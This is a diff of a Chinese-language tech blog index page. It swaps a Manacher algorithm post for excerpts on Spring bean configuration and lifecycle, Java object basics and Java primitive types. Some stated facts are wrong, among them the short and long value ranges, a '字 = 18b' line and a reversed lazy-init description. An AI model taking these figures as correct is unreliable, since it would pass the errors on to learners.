@@ -138,51 +138,853 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-algorithm/manacher/manacher" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-java/spring/spring基础1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/05/27/algorithm/manacher/manacher/">马拉车算法</a>
+      <a class="article-title" href="/2019/06/23/java/spring/spring基础1/">spring基础一 bean</a>
     </h1>
   
 
         
-        <a href="/2019/05/27/algorithm/manacher/manacher/" class="archive-article-date">
-  	<time datetime="2019-05-27T07:25:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-05-27</time>
+        <a href="/2019/06/23/java/spring/spring基础1/" class="archive-article-date">
+  	<time datetime="2019-06-22T16:58:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-23</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="manacher算法"><a href="#manacher算法" class="headerlink" title="manacher算法"></a>manacher算法</h3><p>处理回文字符串:<br><br>一搬思路为中心拓展:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//预处理，得到不分奇偶的新串 #a#b#a#c#</span><br><span class="line">for(int i=0; i&lt;len; i++)&#123;</span><br><span class="line">  for (int j = 0; (i-j &gt;= 0) &amp;&amp; (i+j &lt; len); j++)&#123;</span><br><span class="line">		  //在左右j距离拓展匹配</span><br><span class="line">      if (s[i - j] != s[i + j])</span><br><span class="line">				break;</span><br><span class="line">      //纪录最大距离</span><br><span class="line">	&#125;</span><br><span class="line">  //更新最大子串</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>Manacher算法，将时间压缩到线性，时间复杂度/空间复杂度都是O(n).</p>
-<h5 id="1-新串"><a href="#1-新串" class="headerlink" title="1.新串"></a>1.新串</h5><p>无论字符串原先为奇数还是偶数长度，通过添加特殊字符都能使之变为奇数，减少判断条件。<br><br>例:</p>
-<ul>
-<li>aba &gt;&gt; #a#b#a#</li>
-<li>abab &gt;&gt; #a#b#a#b#</li>
+        <h3 id="1-Bean的属性"><a href="#1-Bean的属性" class="headerlink" title="1.Bean的属性"></a>1.Bean的属性</h3><p>bean的 .xml 文件<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">xsi:schemaLocation=&quot;</span><br><span class="line">http://www.springframework.org/schema/beans</span><br><span class="line">http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 自己的bean --&gt;</span><br><span class="line">&lt;bean&gt;&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure></p>
+<p>将bean交给spring:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@ImportResource(locations = &#123;&quot;classpath:xxxx.xml&quot;&#125;)</span><br></pre></td></tr></table></figure></p>
+<h6 id="1-自身属性"><a href="#1-自身属性" class="headerlink" title="(1).自身属性"></a>(1).自身属性</h6><ul>
+<li>id</li>
 </ul>
-<h5 id="2-循环得到p-i"><a href="#2-循环得到p-i" class="headerlink" title="2.循环得到p[i]"></a>2.循环得到p[i]</h5><p>首先定义几个变量: <br></p>
+<p>id为bean的唯一标识名，也就是beanName.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=&quot;userEntity&quot; class=&quot;com.bonc.apimanage.test.UserEntity&quot;&gt;</span><br><span class="line">      &lt;!-- 通过setter注入属性值 --&gt;</span><br><span class="line">       &lt;property name=&quot;id&quot; value=&quot;123&quot;&gt;&lt;/property&gt;</span><br><span class="line">&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">&lt;bean id=&quot;userService&quot; class=&quot;com.bonc.apimanage.test.UserService&quot;&gt;</span><br><span class="line">    &lt;!-- 注入 userEntity 属性对象 --&gt;</span><br><span class="line">    &lt;property name=&quot;userService&quot; ref=&quot;userEntity&quot;&gt;&lt;/property&gt;</span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure></p>
 <ul>
-<li>p[i] 存储对应位置(i)的最大子串的长度,左或右半边(包括了自己本身)</li>
-<li>pos 当前最大子串的中心位置</li>
-<li>mxr 当前最大子串的右边界</li>
-<li>mxl 当前最大字串的左边界</li>
+<li>name</li>
 </ul>
-<p><img src="./manacher01.png" alt="manacher"><br>manacher算法的关键: <br><br>//p[i] = mxr &gt; i ? Math.min(p[2*pos -i], mxr-i):1;<br><br><strong>p[i] = mxr &gt; i ? Math.min(p[2pos -i], mxr-i):0;</strong>  </p>
-<p>如图，i和j关于pos对称，pos-j = i-pos， 即 j = 2*pos-i<br><br>当要计算第i位的p[i]时，i位之前的p[i]都为已知：<br><br>此时:<br></p>
-<h6 id="1-若i在mxr右边"><a href="#1-若i在mxr右边" class="headerlink" title="(1).若i在mxr右边"></a>(1).若i在mxr右边</h6><p>将p[i]置为1(因为mxr的位置必定为#,它的下一位肯定&gt;=1,但是如果mxr==i,则为p[i]肯定为0，所以这里置为0)，进行拓展匹配。<br></p>
-<h6 id="2-若i在当前最大字串范围内："><a href="#2-若i在当前最大字串范围内：" class="headerlink" title="(2).若i在当前最大字串范围内："></a>(2).若i在当前最大字串范围内：<br></h6><p><strong>mxr-i 与 p[j] 的关系，判断以 j 为中心的子串是否完全在以pos为中心的子串内.<br></strong></p>
+<p>bean的别名。</p>
 <ul>
-<li>若 mxr - i &gt; p[j](例p[10]，p[11],p[12]), 此时可知已j为中心的回文串，包含在以pos为中心的回文串左边部分内，由左右对称可知，以i为中心的回文串p[i] = p[j]<br></li>
-<li>若 mxr -i &lt;= p[j](例p[13]), 此时mxr-i和j-mxl部分是一样的，可以保证如果原理这部分关于j对称的话(又因为mxr-i&lt;=p[j],所以这部分肯定对称，j-mxl是j的字串的一部分)，至少这部分关于i肯定对称，所以p[i]至少有mxr-i的长度,再向右进行拓展匹配<br></li>
+<li>class</li>
 </ul>
-<p>取p[j]和mxr-i中较小的值，再进行拓展匹配<br></p>
-<p>这样循环一次就得到了所有p[i]的值。</p>
-<h5 id="3-具体代码"><a href="#3-具体代码" class="headerlink" title="3.具体代码"></a>3.具体代码</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public String longestPalindrome(String s) &#123;</span><br><span class="line">        //生成新串</span><br><span class="line">        StringBuffer sb = new StringBuffer();</span><br><span class="line">        for(int i=0; i&lt;s.length()*2+1; i++)&#123;</span><br><span class="line">            if(i%2 == 0)&#123;</span><br><span class="line">                sb.append(&quot;#&quot;);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                sb.append(s.charAt(i/2));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        String ns = sb.toString();</span><br><span class="line">        //处理</span><br><span class="line">        int[] p = new int[ns.length()];</span><br><span class="line">        p[0] = 0;</span><br><span class="line">        int pos = 0, mxr = 0;</span><br><span class="line">        for(int i=0; i&lt;ns.length(); i++)&#123;</span><br><span class="line">            p[i] = mxr&gt;i ? Math.min(p[pos*2-i],mxr-i):0;</span><br><span class="line">            //继续进行拓展</span><br><span class="line">            //是否到达左边界，是否到达右边界，是否对称</span><br><span class="line">            while(i-p[i] &gt;=0</span><br><span class="line">                 &amp;&amp; i+p[i]&lt;= ns.length()-1</span><br><span class="line">                 &amp;&amp; ns.charAt(i+p[i]) == ns.charAt(i-p[i]))&#123;</span><br><span class="line">                p[i]+=1;</span><br><span class="line">            &#125;</span><br><span class="line">            //发现更大的子串，进行调整，如果相等，不调整，取第一个</span><br><span class="line">            if(p[i]&gt; mxr-pos)&#123;</span><br><span class="line">                pos = i;</span><br><span class="line">                mxr = p[i] + i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        //因为p[pos]的长度包括了pos自己,所以回文串范围为(pos-p[pos]+1, pos+p[pos]-1)</span><br><span class="line">        //因为substring取值为[a,b)，所以范围为(pos-p[pos]+1, pos+p[pos])</span><br><span class="line">         return ns.substring(pos-p[pos]+1, pos+p[pos]).replace(&quot;#&quot;,&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>bean的类。子类bean不用定义该属性。</p>
+<ul>
+<li>parent</li>
+</ul>
+<p>子类Bean定义它所引用它的父类Bean。这时class属性失效。子类Bean会继承父类Bean的所有属性，子类Bean也可以覆盖父类Bean的属性。注意：子类Bean和父类Bean是同一个Java类</p>
+<ul>
+<li>abstract</li>
+</ul>
+<p>默认为”false”，用来定义Bean是否为抽象Bean。它表示这个Bean将不会被实例化，一般用于父类Bean，因为父类Bean主要是供子类Bean继承使用。</p>
+<ul>
+<li>scope</li>
+</ul>
+<p>默认为singleton（单例）<br></p>
+<p>prototype（原型）状态，BeanFactory将为每次Bean请求创建一个新的Bean实例。<br><br>session：创建对象把创建的对象放到session域里面去<br><br>request：创建对象把创建的对象放到request域里面去<br><br>globalsession：创建对象把创建的对象放到globalsession域里面去<br></p>
+<ul>
+<li>lazy-init</li>
+</ul>
+<p>用来定义这个Bean是否实现懒初始化<br><br>默认为 default  <br><br>如果为 true ，它将在BeanFactory启动时初始化所有的SingletonBean<br><br>如果为 false ,它只在Bean请求时才开始创建SingletonBean。</p>
+<ul>
+<li>autowire</li>
+</ul>
+<p>它定义了Bean的自动装载方式<br><br>no :不使用自动装配功能<br><br>byName :通过Bean的属性名实现自动装配<br><br>byType :通过Bean的类型实现自动装配<br><br>constructor :类似于byType，但它是用于构造函数的参数的自动组装<br><br>default：默认值，自动装配</p>
+<ul>
+<li>depends-on</li>
+</ul>
+<p>Bean在初始化时依赖的对象，这个对象会在这个Bean初始化之前创建<br><br>可以用来控制bean初始化顺序</p>
+<ul>
+<li>init-method</li>
+</ul>
+<p>用来定义Bean的初始化方法，它会在Bean组装之后调用。它必须是一个无参数的方法</p>
+<ul>
+<li>destory-method</li>
+</ul>
+<p>用来定义Bean的销毁方法，它在 BeanFactory 关闭时调用。同样，它也必须是一个无参数的方法。它只能应用于 singletonBean。</p>
+<ul>
+<li>factory-method</li>
+</ul>
+<p>定义创建该Bean对象的工厂方法。它用于下面的 factory-bean ，表示这个Bean是通过工厂方法创建。此时， class 属性失效</p>
+<ul>
+<li>factory-bean</li>
+</ul>
+<p>定义创建该 Bean 对象的工厂类。如果使用了 factory-bean 则 class 属性失效</p>
+<h6 id="2-子属性"><a href="#2-子属性" class="headerlink" title="(2).子属性"></a>(2).子属性</h6><ul>
+<li>meta</li>
+</ul>
+<p>元数据。当需要使用里面的信息时可以通过key获取<br><br>meta 所声明的 key 并不会在 Bean 中体现，只是一个额外的声明，当我们需要使用里面的信息时，通过 BeanDefinition 的 getAttribute() 获取<br></p>
+<ul>
+<li>lookup-method</li>
+</ul>
+<p>获取器注入，是把一个方法声明为返回某种类型的 bean 但实际要返回的 bean 是在配置文件里面配置的。该方法可以用于设计一些可插拔的功能上，解除程序依赖</p>
+<ul>
+<li>replaced-method</li>
+</ul>
+<p>可以在运行时调用新的方法替换现有的方法，还能动态的更新原有方法的逻辑</p>
+<ul>
+<li>constructor-arg</li>
+</ul>
+<p>通过构造函数注入。&lt;br<br>index：指定注入属性的顺序索引(在构造函数中的顺序)，从0开始<br><br>type：指该属性所对应的类型<br><br>ref：引用的依赖对象<br><br>value：当注入的不是依赖对象，而是基本数据类型时，就用value<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=&quot;userEntity&quot; class=&quot;com.bonc.apimanage.test.UserEntity&quot;&gt;</span><br><span class="line">      &lt;!-- 通过构造器注入属性值 有参的需要有参的构造函数 --&gt;</span><br><span class="line">      &lt;constructor-arg index=&quot;0&quot; value=&quot;1&quot;&gt;&lt;/constructor-arg&gt;  </span><br><span class="line">      &lt;constructor-arg index=&quot;1&quot; value=&quot;xxl&quot;&gt;&lt;/constructor-arg&gt;</span><br><span class="line">      &lt;!-- 或这样  --&gt;</span><br><span class="line">      &lt;constructor-arg name=&quot;id&quot; value=&quot;1&quot;&gt;&lt;/constructor-arg&gt;  </span><br><span class="line">      &lt;constructor-arg nam=&quot;name&quot; value=&quot;xxl&quot;&gt;&lt;/constructor-arg&gt;   </span><br><span class="line">&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">&lt;bean id=&quot;userService&quot; class=&quot;com.bonc.apimanage.test.UserService&quot;&gt;</span><br><span class="line">      &lt;constructor-arg  ref=&quot;userEntity&quot;&gt;&lt;/constructor-arg&gt;</span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>property</li>
+</ul>
+<p>通过setter对应的方法注入。<br></p>
+<ul>
+<li>qualifier</li>
+</ul>
+<p>明确指定bean的名称进行注入</p>
+<h3 id="2-Bean的生命周期"><a href="#2-Bean的生命周期" class="headerlink" title="2.Bean的生命周期"></a>2.Bean的生命周期</h3><p>Spring 只帮我们管理单例模式 Bean 的完整生命周期，对于 prototype 的 bean ，Spring 在创建好交给使用者之后则不会再管理后续的生命周期。<br></p>
+<p><img src="https://pic3.zhimg.com/80/754a34e03cfaa40008de8e2b9c1b815c_hd.jpg" alt="bean生命周期"></p>
+<ul>
+<li>实例化</li>
+</ul>
+<p>对于BeanFactory容器，当客户向容器请求一个尚未初始化的bean时，或初始化bean的时候需要注入另一个尚未初始化的依赖时，容器就会调用createBean进行实例化。<br><br>对于ApplicationContext容器，当容器启动结束后，便实例化所有的bean。 容器通过获取BeanDefinition对象中的信息进行实例化。并且这一步仅仅是简单的实例化，并未进行依赖注入。<br><br>实例化对象被包装在BeanWrapper对象中，BeanWrapper提供了设置对象属性的接口，从而避免了使用反射机制设置属性。</p>
+<ul>
+<li>填充属性</li>
+</ul>
+<p>Spring将值和Bean的引用注入进Bean对应的属性中(依赖注入).</p>
+<ul>
+<li>Aware相关</li>
+</ul>
+<p>Spring中 特定的Aware接口，提供了对IOC容器的操作.<br></p>
+<ul>
+<li><p>BeanPostProcessor前置处理(postProcessorBeforeInitializion)</p>
+</li>
+<li><p>InitiallizionBean 中 afterProjectSet方法</p>
+</li>
+<li><p>自定义的init-method</p>
+</li>
+<li><p>BeanPostProcessor的后置处理(postProcessorAfterInitializion)</p>
+</li>
+<li><p>Bean就绪</p>
+</li>
+<li><p>DisposableBean的destory方法</p>
+</li>
+<li><p>自定义的destory-method</p>
+</li>
+</ul>
+<h3 id="3-Spring的七个模块"><a href="#3-Spring的七个模块" class="headerlink" title="3.Spring的七个模块"></a>3.Spring的七个模块</h3><ul>
+<li>1.Spring Core</li>
+</ul>
+<p>Core模块是Spring的核心类库，Spring的所有功能都依赖于该类库，Core主要实现IOC功能，Sprign的所有功能都是借助IOC实现的</p>
+<ul>
+<li>2.Spring Aop</li>
+</ul>
+<p>AOP模块是Spring的AOP库，提供了AOP（拦截器）机制，并提供常用的拦截器，供用户自定义和配置</p>
+<ul>
+<li><p>3.Spring ORM</p>
+</li>
+<li><p>4.Spring DAO</p>
+</li>
+<li><p>5.Spring Web</p>
+</li>
+<li><p>6.Spring context</p>
+</li>
+</ul>
+<p>Spring上下文是spring的配置文件，向Spring框架提供上下文信息,可以用来管理bean.</p>
+<ul>
+<li>7.Spring WebMVC</li>
+</ul>
+<p>WEB MVC模块为Spring提供了一套轻量级的MVC实现，在Spring的开发中，我们既可以用Struts也可以用Spring自己的MVC框架，相对于Struts，Spring自己的MVC框架更加简洁和方便  </p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">java</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">spring</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/06/23/java/spring/spring基础1/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-java/base/java基础二" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/06/21/java/base/java基础二/">java基础二</a>
+    </h1>
+  
+
+        
+        <a href="/2019/06/21/java/base/java基础二/" class="archive-article-date">
+  	<time datetime="2019-06-21T07:59:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-21</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="1-抽象类和接口"><a href="#1-抽象类和接口" class="headerlink" title="1.抽象类和接口"></a>1.抽象类和接口</h3><h6 id="1-为什么要有抽象类"><a href="#1-为什么要有抽象类" class="headerlink" title="(1).为什么要有抽象类"></a>(1).为什么要有抽象类</h6><p>引入抽象方法和抽象类，是Java提供的一种语法工具，对于一些类和方法，引导使用者正确使用它们，减少被误用。<br></p>
+<p>使用抽象方法，而非空方法体，子类就知道他必须要实现该方法，而不可能忽略。<br></p>
+<p>使用抽象类，类的使用者创建对象的时候，就知道他必须要使用某个具体子类，而不可能误用不完整的父类。<br></p>
+<p>总结，1.规范，2.减少误用。<br></p>
+<h6 id="2-有了抽象类为什么还要接口"><a href="#2-有了抽象类为什么还要接口" class="headerlink" title="(2).有了抽象类为什么还要接口"></a>(2).有了抽象类为什么还要接口</h6><p>抽象类是一个类，Java一个类可以实现多个接口，但只能继承一个类(继承的好处是复用代码)。所以需要接口。<br><br>抽象类和接口是配合而非替代关系，它们经常一起使用，接口声明能力，抽象类提供默认实现，实现全部或部分方法，一个接口经常有一个对应的抽象类。抽象类实现接口部分方法，然后继承于抽象类的类就可以只实现剩下的方法。<br></p>
+<p>Collection接口和对应的AbstractCollection抽象类<br><br>List接口和对应的AbstractList抽象类<br><br>Map接口和对应的AbstractMap抽象类<br></p>
+<h6 id="3-接口和抽象类"><a href="#3-接口和抽象类" class="headerlink" title="(3).接口和抽象类"></a>(3).接口和抽象类</h6><p>抽象类和抽象方法都使用 abstract 关键字进行声明。如果一个类中包含抽象方法，那么这个类必须声明为抽象类。抽象类和普通类最大的区别是，抽象类不能被实例化，需要继承抽象类才能实例化其子类<br></p>
+<p>接口可以类似的看成一个方法全是抽象方法的抽象类。</p>
+<p>接口的字段只能是 static 和 final 类型的，而抽象类的字段没有这种限制。<br><br>接口的成员只能是 public 的，而抽象类的成员可以有多种访问权限。<br></p>
+<p>所以在使用的选择时:</p>
+<ul>
+<li>使用接口：</li>
+</ul>
+<p>需要让不相关的类都实现一个方法<br><br>需要使用多重继承。<br></p>
+<ul>
+<li>使用抽象类：</li>
+</ul>
+<p>需要在几个相关的类中共享代码。(实现部分方法)<br><br>需要能控制继承来的成员的访问权限，而不是都为 public。<br><br>需要继承非静态和非常量字段。<br></p>
+<h3 id="2-重写与重载"><a href="#2-重写与重载" class="headerlink" title="2.重写与重载"></a>2.重写与重载</h3><p>override/overload<br></p>
+<p>为了满足里式替换原则，重写有以下三个限制：<br></p>
+<blockquote>
+<p>子类方法的访问权限必须大于等于父类方法；<br><br>子类方法的返回类型必须是父类方法返回类型或为其子类型。<br><br>子类方法抛出的异常类型必须是父类抛出异常类型或为其子类型。<br></p>
+</blockquote>
+<p>JVM虚拟机中，重载实际上调用 的封装类型，重写实际上调用的实际类型<br></p>
+<h3 id="3-Object"><a href="#3-Object" class="headerlink" title="3.Object"></a>3.Object</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">public native int hashCode()</span><br><span class="line"></span><br><span class="line">public boolean equals(Object obj)</span><br><span class="line"></span><br><span class="line">protected native Object clone() throws CloneNotSupportedException</span><br><span class="line"></span><br><span class="line">public String toString()</span><br><span class="line"></span><br><span class="line">public final native Class&lt;?&gt; getClass()</span><br><span class="line"></span><br><span class="line">protected void finalize() throws Throwable &#123;&#125;</span><br><span class="line"></span><br><span class="line">public final native void notify()</span><br><span class="line"></span><br><span class="line">public final native void notifyAll()</span><br><span class="line"></span><br><span class="line">public final native void wait(long timeout) throws InterruptedException</span><br><span class="line"></span><br><span class="line">public final void wait(long timeout, int nanos) throws InterruptedException</span><br><span class="line"></span><br><span class="line">public final void wait() throws InterruptedException</span><br></pre></td></tr></table></figure>
+<h6 id="1-hashCode"><a href="#1-hashCode" class="headerlink" title="(1).hashCode()"></a>(1).hashCode()</h6><p>采用操作系统底层实现的哈希算法,返回对象的hash值。 同一个对象的哈希码值是唯一的。<br></p>
+<h6 id="2-equals"><a href="#2-equals" class="headerlink" title="(2).equals()"></a>(2).equals()</h6><p>equals() 是用来判断两个对象是否等价。等价的两个对象散列值一定相同，但是散列值相同的两个对象不一定等价。<br><br>等价关系：自反性/对称性/传递性/一致性<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">自反：x.equals(x); // true</span><br><span class="line"></span><br><span class="line">对称：x.equals(y) == y.equals(x); // true</span><br><span class="line"></span><br><span class="line">传递：if (x.equals(y) &amp;&amp; y.equals(z))</span><br><span class="line">    x.equals(z); // true;</span><br><span class="line"></span><br><span class="line">一致：x.equals(y) == x.equals(y); // true</span><br></pre></td></tr></table></figure></p>
+<h6 id="3-toString"><a href="#3-toString" class="headerlink" title="(3).toString()"></a>(3).toString()</h6><p>返回 类型(class)@hash的无符号十六进制<br><br>例：ToStringExample@4554617c <br></p>
+<h3 id="4-浅拷贝和深拷贝"><a href="#4-浅拷贝和深拷贝" class="headerlink" title="4.浅拷贝和深拷贝"></a>4.浅拷贝和深拷贝</h3><p>在 Java 中，除了基本数据类型（元类型）之外，还存在 类的实例对象 这个引用数据类型。而一般使用 = 号做赋值操作的时候。对于基本数据类型，实际上是拷贝的它的值，但是对于对象而言，其实赋值的只是这个对象的引用，将原对象的引用传递过去。<br></p>
+<p>而浅拷贝和深拷贝就是在这个基础之上做的区分，如果在拷贝这个对象的时候，对引用数据类型<strong>只是进行了引用的传递</strong>，而没有真实的创建一个新的对象，则认为是浅拷贝。反之，在对引用数据类型进行拷贝的时候，<strong>创建了一个新的对象，并且复制其内的成员变量</strong>，则认为是深拷贝。<br></p>
+<h3 id="5-final与static"><a href="#5-final与static" class="headerlink" title="5.final与static"></a>5.final与static</h3><p>final可以修饰：属性，方法，类，局部变量（方法中的变量）<br><br>static可以修饰：属性，方法，代码段，内部类（静态内部类或嵌套内部类）<br></p>
+<p>static修饰的属性强调它们只有一个，可以在不new对象的情况下调用，final强调不能修改。static final修饰的属性表示一旦给值，就不可修改，并且可以通过类名访问。<br></p>
+<p>初始化顺序:静态变量和静态语句块优先于实例变量和普通语句块，静态变量和静态语句块的初始化顺序取决于它们在代码中的顺序。<br></p>
+<h3 id="6-反射"><a href="#6-反射" class="headerlink" title="6.反射"></a>6.反射</h3><h5 id="为什么要用反射"><a href="#为什么要用反射" class="headerlink" title="为什么要用反射"></a>为什么要用反射</h5><p>反射的核心是可以在运行时才动态加载类的信息。<br><br>利用这个特性，可以使代码变得灵活，如一开始不知道某个类的信息，不能new,但是可以通过配置文件或者插件等引入，使用反射在运行时加载。利用配置文件时，可以将类描述(属性信息)写在配置文件中，不用每次修改代码<br><br>反射会牺牲一点性能。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/06/21/java/base/java基础二/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-java/base/java基本数据类型" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/06/17/java/base/java基本数据类型/">java数据类型</a>
+    </h1>
+  
+
+        
+        <a href="/2019/06/17/java/base/java基本数据类型/" class="archive-article-date">
+  	<time datetime="2019-06-17T03:26:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-17</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="一-8种基本数据类型"><a href="#一-8种基本数据类型" class="headerlink" title="一.8种基本数据类型"></a>一.8种基本数据类型</h2><h3 id="1-大小"><a href="#1-大小" class="headerlink" title="1.大小"></a>1.大小</h3><ul>
+<li>位 bit(b)  </li>
+<li>字节 Byte(B) = 8b</li>
+<li>字  = 18b</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">类型</th>
+<th style="text-align:center">大小</th>
+<th style="text-align:center">范围</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">boolean</td>
+<td style="text-align:center">1位</td>
+<td style="text-align:center">ture/false(0/1)</td>
+</tr>
+<tr>
+<td style="text-align:center">byte</td>
+<td style="text-align:center">8位/1字节</td>
+<td style="text-align:center">-128–127</td>
+</tr>
+<tr>
+<td style="text-align:center">short</td>
+<td style="text-align:center">16位/2字节</td>
+<td style="text-align:center">-32768–132767</td>
+</tr>
+<tr>
+<td style="text-align:center">char</td>
+<td style="text-align:center">16位/2字节</td>
+<td style="text-align:center">\u0000–\uffff(一个16unicode字符)</td>
+</tr>
+<tr>
+<td style="text-align:center">int</td>
+<td style="text-align:center">32位/4字节</td>
+<td style="text-align:center">-2^31–2^31-1</td>
+</tr>
+<tr>
+<td style="text-align:center">float</td>
+<td style="text-align:center">32位/4字节</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">long</td>
+<td style="text-align:center">64位/8字节</td>
+<td style="text-align:center">-2^63–2^63</td>
+</tr>
+<tr>
+<td style="text-align:center">double</td>
+<td style="text-align:center">64位/8字节</td>
+</tr>
+</tbody>
+</table>
+<h3 id="2-转换"><a href="#2-转换" class="headerlink" title="2.转换"></a>2.转换</h3><ul>
